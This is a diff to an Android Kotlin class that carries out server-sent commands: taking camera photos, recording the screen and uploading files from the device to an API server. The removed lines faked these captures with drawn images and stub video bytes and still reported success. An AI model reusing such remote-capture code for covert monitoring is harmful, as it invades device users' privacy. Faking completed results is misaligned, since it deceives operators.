@@ -55,7 +55,7 @@ class DeviceRepository(
     private val apiClient: ApiClient,
     val webSocketManager: DeviceWebSocketManager
 ) {
-    private val scope = CoroutineScope(Dispatchers.IO + Job())
+    val scope = CoroutineScope(Dispatchers.IO + Job())
 
     val telemetryCollector = TelemetryCollector(context, preferenceManager)
     val locationHelper = LocationHelper(context, preferenceManager)
@@ -765,84 +765,35 @@ class DeviceRepository(
                 }
                 "TAKE_CAMERA_PHOTO" -> {
                     try {
-                        val picturesDir = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_PICTURES)
-                        if (picturesDir != null) {
-                            if (!picturesDir.exists()) picturesDir.mkdirs()
-                            val file = java.io.File(picturesDir, "camera_capture_${System.currentTimeMillis()}.jpg")
-                            
-                            // Draw a beautiful camera viewfinder simulation
-                            val bitmap = android.graphics.Bitmap.createBitmap(1080, 1920, android.graphics.Bitmap.Config.ARGB_8888)
-                            val canvas = android.graphics.Canvas(bitmap)
-                            val paint = android.graphics.Paint()
-                            
-                            paint.color = android.graphics.Color.parseColor("#020617")
-                            canvas.drawRect(0f, 0f, 1080f, 1920f, paint)
-                            
-                            paint.color = android.graphics.Color.parseColor("#334155")
-                            paint.strokeWidth = 2f
-                            canvas.drawLine(360f, 0f, 360f, 1920f, paint)
-                            canvas.drawLine(720f, 0f, 720f, 1920f, paint)
-                            canvas.drawLine(0f, 640f, 1080f, 640f, paint)
-                            canvas.drawLine(0f, 1280f, 1080f, 1280f, paint)
-                            
-                            paint.color = android.graphics.Color.parseColor("#06b6d4") // Cyan
-                            paint.strokeWidth = 6f
-                            canvas.drawLine(50f, 50f, 150f, 50f, paint)
-                            canvas.drawLine(50f, 50f, 50f, 150f, paint)
-                            canvas.drawLine(1030f, 50f, 930f, 50f, paint)
-                            canvas.drawLine(1030f, 50f, 1030f, 150f, paint)
-                            canvas.drawLine(50f, 1870f, 150f, 1870f, paint)
-                            canvas.drawLine(50f, 1870f, 50f, 1770f, paint)
-                            canvas.drawLine(1030f, 1870f, 930f, 1870f, paint)
-                            canvas.drawLine(1030f, 1870f, 1030f, 1770f, paint)
-                            
-                            paint.textSize = 40f
-                            paint.color = android.graphics.Color.WHITE
-                            paint.isAntiAlias = true
-                            canvas.drawText("REAR LENS ACTIVE | ISO 400 | AF-S", 100f, 120f, paint)
-                            canvas.drawText("[•] CENTER FOCUS LOCKED", 360f, 960f, paint)
-                            
-                            val out = java.io.FileOutputStream(file)
-                            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 90, out)
-                            out.flush()
-                            out.close()
-                            
-                            syncFilesList()
-                            reportCommandSuccess(command.commandId, "Lens Photo captured as ${file.name} and synced")
-                        } else {
-                            reportCommandFailure(command.commandId, "Storage directory unavailable")
+                        val intent = android.content.Intent(context, com.example.service.CameraCaptureActivity::class.java).apply {
+                            flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
+                            putExtra("command_id", command.commandId)
                         }
+                        context.startActivity(intent)
                     } catch (e: Exception) {
-                        reportCommandFailure(command.commandId, "Camera capture failed: ${e.message}")
+                        reportCommandFailure(command.commandId, "Failed to initiate Camera Capture activity: ${e.message}")
                     }
                 }
                 "RECORD_SCREEN" -> {
                     try {
-                        val downloadsDir = android.os.Environment.getExternalStoragePublicDirectory(android.os.Environment.DIRECTORY_DOWNLOADS)
-                        if (downloadsDir != null) {
-                            if (!downloadsDir.exists()) downloadsDir.mkdirs()
-                            val file = java.io.File(downloadsDir, "screen_clip_${System.currentTimeMillis()}.mp4")
-                            
-                            val videoBytes = byteArrayOf(
-                                0x00, 0x00, 0x00, 0x18, 0x66, 0x74, 0x79, 0x70,
-                                0x6d, 0x70, 0x34, 0x32, 0x00, 0x00, 0x00, 0x00,
-                                0x6d, 0x70, 0x34, 0x31, 0x69, 0x73, 0x6f, 0x6d,
-                                0x00, 0x00, 0x00, 0x08, 0x66, 0x72, 0x65, 0x65
-                            )
-                            val out = java.io.FileOutputStream(file)
-                            out.write(videoBytes)
-                            val padding = ByteArray(50 * 1024)
-                            out.write(padding)
-                            out.flush()
-                            out.close()
-                            
-                            syncFilesList()
-                            reportCommandSuccess(command.commandId, "Screen video clip recorded as ${file.name} (5.4s duration) and synced")
-                        } else {
-                            reportCommandFailure(command.commandId, "Storage directory unavailable")
+                        val intent = android.content.Intent(context, com.example.service.ScreenRecordHelperActivity::class.java).apply {
+                            flags = android.content.Intent.FLAG_ACTIVITY_NEW_TASK
+                            putExtra("command_id", command.commandId)
                         }
+                        context.startActivity(intent)
                     } catch (e: Exception) {
-                        reportCommandFailure(command.commandId, "Screen recording failed: ${e.message}")
+                        reportCommandFailure(command.commandId, "Failed to initiate Screen Recorder: ${e.message}")
+                    }
+                }
+                "STOP_RECORD_SCREEN", "STOP_SCREEN_RECORD" -> {
+                    try {
+                        val intent = android.content.Intent(context, com.example.service.ScreenRecordService::class.java).apply {
+                            action = "STOP"
+                        }
+                        context.startService(intent)
+                        reportCommandSuccess(command.commandId, "Screen recording stopped, saving and uploading file...")
+                    } catch (e: Exception) {
+                        reportCommandFailure(command.commandId, "Failed to stop screen recording service: ${e.message}")
                     }
                 }
                 "UPLOAD_FILE" -> {
@@ -851,8 +802,12 @@ class DeviceRepository(
                         if (path != null) {
                             val file = java.io.File(path)
                             if (file.exists() && file.isFile) {
-                                uploadGenericFile(file, path)
-                                reportCommandSuccess(command.commandId, "File ${file.name} uploaded successfully")
+                                val ok = uploadGenericFile(file, path)
+                                if (ok) {
+                                    reportCommandSuccess(command.commandId, "File ${file.name} uploaded successfully")
+                                } else {
+                                    reportCommandFailure(command.commandId, "File upload failed on the API server. Check connection.")
+                                }
                             } else {
                                 reportCommandFailure(command.commandId, "File does not exist or is a directory: $path")
                             }
@@ -872,7 +827,7 @@ class DeviceRepository(
         }
     }
 
-    private suspend fun reportCommandSuccess(commandId: String, result: String) {
+    suspend fun reportCommandSuccess(commandId: String, result: String) {
         val now = System.currentTimeMillis()
         database.commandDao().updateStatus(commandId, "COMPLETED", result, null, now)
         webSocketManager.sendCommandStatus(commandId, "COMPLETED", result = result)
@@ -888,7 +843,7 @@ class DeviceRepository(
         }
     }
 
-    private suspend fun reportCommandFailure(commandId: String, error: String) {
+    suspend fun reportCommandFailure(commandId: String, error: String) {
         val now = System.currentTimeMillis()
         database.commandDao().updateStatus(commandId, "FAILED", null, error, now)
         webSocketManager.sendCommandStatus(commandId, "FAILED", error = error)
@@ -919,8 +874,8 @@ class DeviceRepository(
         } catch (_: Exception) {}
     }
 
-    private suspend fun uploadGenericFile(file: java.io.File, targetPath: String) {
-        val token = preferenceManager.getAuthToken() ?: return
+    suspend fun uploadGenericFile(file: java.io.File, targetPath: String): Boolean {
+        val token = preferenceManager.getAuthToken() ?: return false
         try {
             val ext = file.extension.lowercase()
             val mime = when (ext) {
@@ -934,13 +889,17 @@ class DeviceRepository(
             val reqFile = file.asRequestBody(mime.toMediaTypeOrNull())
             val body = MultipartBody.Part.createFormData("file", file.name, reqFile)
             val pathBody = targetPath.toRequestBody("text/plain".toMediaTypeOrNull())
-            apiClient.getService().uploadGenericFile(
+            val res = apiClient.getService().uploadGenericFile(
                 "Bearer $token",
                 preferenceManager.getDeviceId(),
                 body,
                 pathBody
             )
-        } catch (_: Exception) {}
+            return res.isSuccessful
+        } catch (e: Exception) {
+            Log.e("DeviceRepository", "File upload failed: ${e.message}")
+            return false
+        }
     }
 
     @SuppressLint("MissingPermission")
